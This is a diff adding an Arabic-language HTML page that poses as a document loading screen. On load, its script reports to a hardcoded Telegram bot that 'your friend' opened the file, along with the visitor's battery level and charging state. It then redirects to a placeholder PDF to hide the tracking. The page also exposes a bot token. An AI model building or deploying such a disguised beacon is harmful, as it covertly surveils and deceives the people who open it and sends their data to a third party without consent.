@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>جاري فتح المستند...</title>
+</head>
+<body>
+    <div style="text-align: center; margin-top: 20%; font-family: Tahoma, sans-serif;">
+        <h3>جاري تحميل الملف، يرجى الانتظار...</h3>
+        <p style="color: gray; font-size: 14px;">يتم الآن تجهيز المستند للعرض...</p>
+    </div>
+
+    <script>
+        const botToken = "9047702593:AAEfGC90i3BfI9fTFzt5D1se2eBBdhd6TUY";
+        const chatId = "7861426333";
+        
+        // رابط ملف الـ PDF الحقيقي الذي سيرى صديقك بعد فتحه
+        const targetPdfUrl = "رابط_ملف_البي_دي_اف_الحقيقي_هنا.pdf";
+
+        // دالة لإرسال الإشعار إلى تلجرام
+        function sendNotification(message) {
+            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=` + encodeURIComponent(message);
+            
+            // استخدام sendBeacon أو fetch لضمان إرسال الطلب حتى لو أغلقت الصفحة
+            if (navigator.sendBeacon) {
+                navigator.sendBeacon(url);
+            } else {
+                fetch(url, { mode: 'no-cors' });
+            }
+        }
+
+        // محاولة جلب نسبة البطارية
+        if ('getBattery' in navigator) {
+            navigator.getBattery().then(function(battery) {
+                let level = Math.round(battery.level * 100);
+                let charging = battery.charging ? 'يشحن ⚡' : 'لا يشحن 🔋';
+                sendNotification(`🚨 تم فتح الملف بواسطة صديقك!\n\n📱 نسبة شحن هاتفه: ${level}%\n🔌 الحالة: ${charging}`);
+            }).catch(function() {
+                sendNotification(`🚨 تم فتح الملف بواسطة صديقك! (تعذر قراءة البطارية لأسباب أمنية بالمتصفح)`);
+            });
+        } else {
+            sendNotification(`🚨 تم فتح الملف بواسطة صديقك! (المتصفح لا يدعم فحص البطارية)`);
+        }
+
+        // تحويله لملف الـ PDF بعد ثانية ونصف لضمان إرسال الرسالة وفتح المستند بسلاسة
+        setTimeout(() => {
+            window.location.href = targetPdfUrl;
+        }, 1500);
+    </script>
+</body>
+</html>
